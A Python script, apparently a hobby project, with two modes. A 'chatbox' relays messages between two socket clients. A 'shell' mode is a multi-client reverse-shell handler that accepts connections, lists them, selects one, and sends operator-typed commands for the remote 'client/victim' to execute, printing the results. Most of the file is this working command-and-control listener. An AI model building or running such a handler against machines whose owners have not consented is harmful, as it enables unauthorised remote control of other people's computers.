import socket
import sys
import threading
import time
from queue import Queue
import datetime
import argparse


parser = argparse.ArgumentParser()
parser.add_argument('--port', type=int, help='port to listen on') # Port argument from user
args = parser.parse_args()
flag = 0
kill = 0

class Communication:
    def __init__(self) :
        self.host = ''
        self.port = args.port
        self.thread_count = 2
        self.jobs = [1, 2]
        self.queue = Queue()
        self.connections_list = []
        self.address_list = []
        self.s = None
        self.s6 = None
   
    def create_socket(self):  # Create a Socket 
        try:
            self.s = socket.socket()

        except socket.error as msg:
            print("Socket creation error: " + str(msg))


    def bind_socket(self):   # Binding the socket and listening for connections
        global flag
        try:
            print("Binding the Port: " + str(self.port))
            flag = 1
            self.s.bind((self.host, self.port))
            self.s.listen(5)

        except socket.error as msg:
            print("Socket Binding error" + str(msg) + "\n" + "Retrying...")
            self.bind_socket()

    def chatbox(self):
        for c in self.connections_list:  # Closing the previous connections if there any
            c.close()

        del self.connections_list[:]
        del self.address_list[:]

        self.s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.s.bind(('', args.port))

        self.s6 = socket.socket(socket.AF_INET6, socket.SOCK_STREAM)
        self.s6.bind(('::1', args.port))
        self.s.listen()
        self.s6.listen()
        i = 0
        while(True):
            inp = input("Enter action:  ")
            if inp == "exit":
                self.s.close()
                self.s6.close()
                break
            if inp != "start":
               print('Invalid action')
               continue    
            print("Waiting for clients.....")
            c1, addr1 = self.s.accept()
            c2, addr2 = self.s6.accept()
            print('Connected to :', addr1[0], ':', addr1[1],
                  " and to: ", addr2[0], ':', addr2[1])
            while(True):
                print(i)
                req1 = None
                req2 = None
                if(req1 == "close"):         # If user input is "close", then we close the socket
                    c1.send('Closing...'.encode())
                    print('Socket Closed')
                    break
                elif(req2 == "close"):         # If user input is "close", then we close the socket
                    c2.send('Closing...'.encode())
                    print('Socket Closed')
                    break
                else:
                    if i % 2 == 0:
                        c2.sendall('wait'.encode())
                        c1.sendall('send'.encode())
                        req1 = c1.recv(1024).decode()  # Recieving user message
                        time.sleep(0.1)
                        c2.sendall(("client-1: " + req1).encode())
                        if req1 == "close":
                            c1.close()
                            c2.close()
                            break
                        i += 1
                    else:
                        c1.sendall('wait'.encode())
                        c2.sendall('send'.encode())
                        time.sleep(0.1)
                        req2 = c2.recv(1024).decode()  # Recieving user message
                        c1.sendall(("client-2: " + req2).encode())
                        if req2 == "close":
                            c1.close()
                            c2.close()
                            break
                        i += 1
                time.sleep(0.7)


    def accepting_connections(self):    # Accepting commands
        for c in self.connections_list: # Closing the previous connections if there any
            c.close()

        del self.connections_list[:]
        del self.address_list[:]

        while True:
            try:
                conn, address = self.s.accept()  # Accept new connection requests from user     

                self.connections_list.append(conn) # Append this connection to the list
                self.address_list.append(address)  # Append this connection to the list

                print("Connection has been established : " + address[0] + "\n" + "zsh> ", end='')

            except:
                print("Error accepting connections") # Error
                break


    def start_shell(self):              # Starting the shell
        while True:
            cmd = input('zsh> ')
            if cmd == 'list':           # If user input is list display all the existing cooections
                self.list_connections()
            elif 'select' in cmd:       # Connecting to one client
                conn,target= self.get_target(cmd)
                if conn is not None:
                    self.send_target_commands(conn,target)
            elif 'exit' in cmd:        # Exiting 
                for c in self.connections_list:
                    c.send(str.encode("close"))
                self.s.close()
                del self.connections_list[:]
                del self.address_list[:]
                break
            else:
                print("Command given is not recognized")


    def list_connections(self):       # Display all current active connections with client to server
        results = ''
        print("-----------Clients-----------")
        for i, conn in enumerate(self.connections_list):
            try:
                conn.send(str.encode(' '))
                conn.recv(20480)
            except:
                del self.connections_list[i]
                del self.address_list[i]
                continue

            results = str(
                i) + "   " + str(self.address_list[i][0]) + "   " + str(self.address_list[i][1]) + "\n"
            print(results)
        


    def get_target(self,cmd):         # Selecting the target
        try:
            target = cmd.replace('select ', '')  # target = id
            target = int(target)
            conn = self.connections_list[target]
            print("You are now connected to :" + str(self.address_list[target][0])) # Connecting to a client
            return conn,target

        except:
            print("Selection not valid")
            return None


    def send_target_commands(self,conn,target): # Send commands to client/victim or a friend
        while True:
            try:
                print(str(self.address_list[target][0])+"@", end="")
                cmd = input('zsh> ')
                ts1 = time.time()
                st = datetime.datetime.fromtimestamp(ts1).strftime('%H:%M:%S')
                print("\nTimestamp : {}\n".format(st))   # Printing timestamp
                if cmd == 'unselect':
                    print("Unselected client "+ str(self.address_list[target][0]) + "\n")
                    break
                if len(str.encode(cmd)) > 0:
                    conn.send(str.encode(cmd)) # Sending the shell command to client to execute
                    client_response = str(conn.recv(20480), "utf-8")
                    print(client_response)
                    ts1 = time.time()
                    st = datetime.datetime.fromtimestamp(ts1).strftime('%H:%M:%S')
                    print("\nTimestamp : {}\n".format(st)) # Printing timestamp
                if cmd == 'close':
                    print("Connection closed with " + str(self.address_list[target][0]) + "\n")
                    del self.connections_list[target]
                    del self.address_list[target]
                    break
            except:
                print("Error sending commands")
                break


    def create_workers(self):    # Create worker threads
        for _ in range(self.thread_count):  # Looping in number of threads given
            t = threading.Thread(target=self.work)
            t.daemon = True
            t.start()


    def work(self):       # Do next job that is in the queue (handle connections, send commands)
        global flag
        global kill
        while True:
            x = self.queue.get()
            if x == 1:
                self.create_socket() # Creating socket
                self.bind_socket()   # Binding socket
                self.accepting_connections()
            while flag == 0:
                pass
            if x == 2 and flag:
                self.start_shell()   # Starting shell action

            kill = 1      # thread killing will start now ;)


    def create_jobs(self):    # Creating jobs 
        global kill 
        for x in self.jobs:
            self.queue.put(x)

        while(not kill):
            pass
        sys.exit()
demo = input("Feature: ")
RUN=Communication()  # Calling object
if demo=="shell":
    RUN.create_workers()
    RUN.create_jobs()
elif demo=="chatbox":
    RUN.chatbox()
